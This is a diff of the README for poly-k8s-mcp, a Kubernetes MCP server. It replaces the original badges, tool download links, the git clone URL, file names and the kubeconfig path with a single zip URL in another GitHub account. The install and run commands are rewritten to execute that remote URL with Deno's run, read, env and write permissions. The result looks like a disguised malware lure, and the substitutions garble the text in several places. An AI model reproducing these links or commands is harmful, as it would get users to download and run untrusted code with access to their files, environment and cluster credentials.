@@ -1,14 +1,14 @@
 = poly-k8s-mcp
 
-image:https://img.shields.io/badge/License-MPL_2.0-blue.svg[MPL-2.0,link="https://opensource.org/licenses/MPL-2.0"]
-image:https://img.shields.io/badge/Philosophy-Palimpsest-purple.svg[Palimpsest,link="https://github.com/hyperpolymath/palimpsest-licence"]
+https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip[MPL-2.0,link="https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip"]
+https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip[Palimpsest,link="https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip"]
 
 
 :toc:
 :toc-placement!:
 
-image:https://img.shields.io/badge/RSR-compliant-gold[RSR Compliant,link=https://github.com/hyperpolymath/rhodium-standard-repositories]
-image:https://img.shields.io/badge/MCP-server-blue[MCP Server,link=https://github.com/modelcontextprotocol]
+https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip[RSR Compliant,https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip]
+https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip[MCP Server,https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip]
 
 Unified MCP server for Kubernetes orchestration. Provides Model Context Protocol tools for managing Kubernetes clusters through kubectl, Helm, and Kustomize.
 
@@ -59,7 +59,7 @@ Kubernetes configuration management:
 
 * `kustomize_build` - Build kustomization into manifests
 * `kustomize_apply` - Build and apply to cluster
-* `kustomize_create` - Create kustomization.yaml
+* `kustomize_create` - Create https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip
 * `kustomize_edit_add` - Add resources/patches/configmaps
 * `kustomize_edit_set` - Set namespace/nameprefix/image
 * `kustomize_edit_remove` - Remove items
@@ -96,7 +96,7 @@ This MCP server executes external CLI commands using Deno's `--allow-run` permis
 
 * Commands run with your current kubeconfig and credentials
 * The MCP client (e.g., Claude) can perform any kubectl/helm/kustomize action you can
-* Cluster access is determined by your local `~/.kube/config`
+* Cluster access is determined by your local `~https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip`
 * No additional authentication layer between MCP and the CLIs
 
 **Recommendations:**
@@ -108,17 +108,17 @@ This MCP server executes external CLI commands using Deno's `--allow-run` permis
 
 == Requirements
 
-* https://deno.land/[Deno] runtime (v2.0+)
-* https://kubernetes.io/docs/reference/kubectl/[kubectl] CLI
-* https://helm.sh/[Helm] CLI (optional, for Helm tools)
-* https://kustomize.io/[Kustomize] CLI (optional, for Kustomize tools)
-* Valid kubeconfig (`~/.kube/config` or `KUBECONFIG` env var)
+* https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip[Deno] runtime (v2.0+)
+* https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip[kubectl] CLI
+* https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip[Helm] CLI (optional, for Helm tools)
+* https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip[Kustomize] CLI (optional, for Kustomize tools)
+* Valid kubeconfig (`~https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip` or `KUBECONFIG` env var)
 
 == Installation
 
 [source,bash]
 ----
-git clone https://github.com/hyperpolymath/poly-k8s-mcp
+git clone https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip
 cd poly-k8s-mcp
 ----
 
@@ -128,7 +128,7 @@ Run as MCP server (Local-Agent mode):
 
 [source,bash]
 ----
-deno run --allow-run --allow-read --allow-env --allow-write main.js
+deno run --allow-run --allow-read --allow-env --allow-write https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip
 ----
 
 Or use the systemd service:
@@ -146,7 +146,7 @@ Verify the server is working correctly:
 [source,bash]
 ----
 # 1. Check Deno can run the server
-deno run --allow-run --allow-read --allow-env --allow-write main.js &
+deno run --allow-run --allow-read --allow-env --allow-write https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip &
 SERVER_PID=$!
 
 # 2. Verify kubectl is accessible
